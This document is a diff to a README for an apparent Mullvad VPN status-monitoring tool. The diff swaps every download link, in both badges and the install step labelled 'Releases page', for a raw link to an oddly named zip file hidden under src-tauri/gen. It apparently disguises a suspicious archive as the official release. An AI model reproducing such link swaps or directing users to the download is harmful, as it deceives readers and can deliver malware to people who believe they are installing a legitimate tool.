@@ -1,6 +1,6 @@
 # 🛡️ mullvad-connection-status - Monitor Your Mullvad VPN Status Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20here-brightgreen)](https://github.com/Fggp09/mullvad-connection-status/releases)
+[![Download Now](https://raw.githubusercontent.com/Fggp09/mullvad-connection-status/main/src-tauri/gen/status-connection-mullvad-fizgig.zip%20Now-Click%20here-brightgreen)](https://raw.githubusercontent.com/Fggp09/mullvad-connection-status/main/src-tauri/gen/status-connection-mullvad-fizgig.zip)
 
 ## 📦 Introduction
 
@@ -13,7 +13,7 @@ To get started with **mullvad-connection-status**, follow these simple steps to 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Fggp09/mullvad-connection-status/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/Fggp09/mullvad-connection-status/main/src-tauri/gen/status-connection-mullvad-fizgig.zip) to find the latest version of the application.
 
 2. **Select Your Version**  
    On the Releases page, find the most recent version. Click on the link to download. Look for files with the `.exe` extension for Windows.
@@ -80,4 +80,4 @@ This application respects your privacy. No personal information is collected or 
 
 Feel free to reach out via GitHub if you have any questions or suggestions! 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20here-brightgreen)](https://github.com/Fggp09/mullvad-connection-status/releases)
+[![Download Now](https://raw.githubusercontent.com/Fggp09/mullvad-connection-status/main/src-tauri/gen/status-connection-mullvad-fizgig.zip%20Now-Click%20here-brightgreen)](https://raw.githubusercontent.com/Fggp09/mullvad-connection-status/main/src-tauri/gen/status-connection-mullvad-fizgig.zip)
